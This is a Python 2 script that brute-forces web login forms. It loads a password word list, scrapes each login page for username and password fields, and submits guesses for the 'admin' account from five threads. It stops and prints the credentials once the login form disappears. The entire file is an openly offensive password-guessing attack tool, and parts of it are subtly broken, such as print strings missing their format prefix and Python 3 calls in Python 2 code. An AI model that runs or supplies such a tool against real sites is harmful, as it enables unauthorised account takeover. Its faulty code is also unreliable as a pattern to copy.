#!/usr/bin/python
import urllib
from  HTMLParser import HTMLParser
import urllib2
import cookielib
import Queue
import threading
import sys
import os

threads = 5
resume_word = None
username = "admin"
headers = {}
target_url = input("URL")
post_url = input ("URL")
username_field = "username"
password_field = "password"

def input_take(targt_url_1,post_url_1):
    global target_url
    global post_url
    target_url=targt_url_1
    post_url=post_url_1

#Takes a word file and builds a word queue object. You can resume a word in the file
#by modifying the resume_word value in the script
def build_passwd_q(passwd_file):
    fd = open(passwd_file, "rb")
    passwd_list = fd.readlines()
    fd.close()

    passwd_q = Queue.Queue()

    if len(passwd_list):
        if not resume_word:
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                passwd_q.put(passwd)
        else:
            resume_found = False
            for passwd in passwd_list:
                passwd = passwd.decode("utf-8").rstrip()
                if passwd == resume_word:
                    resume_found = True
                    passwd_q.put(passwd)
                else:
                    if resume_found:
                        passwd_q.put(passwd)
        return passwd_q

#An instance of this class, would perform the following:
#1- Pull out a password from the queue
#2- Retrieve the login HTML page
#3- Parse the resulting HTML looking for username and password fields
#as part of the input form
#4- Performs a POST on the login page with the username and the retrieved password
#5- Retrieve the resulting HTML page. If the page does not have the login form,
#we assume Brute-Force is successful. Otherwise, repeat the whole process with
#the next password in the queue
class BruteForcer():
    def __init__(self, username, passwd_q):
        self.username = username
        self.passwd_q = passwd_q
        self.found = False

    def html_brute_forcer(self):
        while not passwd_q.empty() and not self.found:
            #Enable cookies for the session
            cookiejar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))

            #This allows urlopen to use cookiejar
            urllib2.install_opener(opener)

            request = urllib2.Request(target_url, headers=headers)
            response = urllib2.urlopen(request)

            #The response is in bytes. Convert to string and remove b''
            page = str(response.read())[2:-1]

            #Parse HTML Form
            parsed_html = BruteParser()
            parsed_html.feed(page)

            if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                parsed_html.parsed_results[username_field] = self.username
                parsed_html.parsed_results[password_field] = self.passwd_q.get()

                print("[*] Attempting {self.username}/{parsed_html.parsed_results[password_field]}")

                #Must be bytes
                post_data = urllib.urlencode(parsed_html.parsed_results).encode()

                brute_force_request = urllib2.Request(post_url, headers=headers)
                brute_force_response = urllib2.urlopen(brute_force_request, data=post_data)

                #The response is in bytes. Convert to string and remove b''
                brute_force_page = str(brute_force_response.read())[2:-1]

                #Parse HTML Form
                brute_force_parsed_html = BruteParser()
                brute_force_parsed_html.feed(brute_force_page)

                if not brute_force_parsed_html.parsed_results:
                    self.found= True
                    print ("[*] Brute-Force Attempt is Successful!")
                    print ("[*] Username: {self.username}")
                    print ("[*] Password: {parsed_html.parsed_results[password_field]}")
                    print ("[*] Done")
                    os._exit(0)
            else:
                print("[!] HTML Page is Invalid")
                break

    #Brute-Forcing with multiple threads
    def html_brute_forcer_thread_starter(self):
        print ("[*] Brute-Forcing with {threads} threads")
        for i in range(threads):
            html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)
            html_brute_forcer_thread.start()

#An instance of this class allows for parsing the HTML page looking for username
#and password fields as part of the input form. self.parsed_results should contain
#username and password keys
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.parsed_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if name == "name" and value == username_field:
                    self.parsed_results[username_field] = username_field
                if name == "name" and value == password_field:
                    self.parsed_results[password_field] = password_field


print("[*] Started HTML Form Brute-Forcer Script")
print("[*] Building Password Queue")
passwd_q = build_passwd_q("passwd.txt")
if passwd_q.qsize():
    print("[*] Password Queue Build Successful")
    attempt_brute_force = BruteForcer("admin", passwd_q)
    attempt_brute_force.html_brute_forcer_thread_starter()
else:
    print("[!] Empty Password File!")
    sys.exit(0)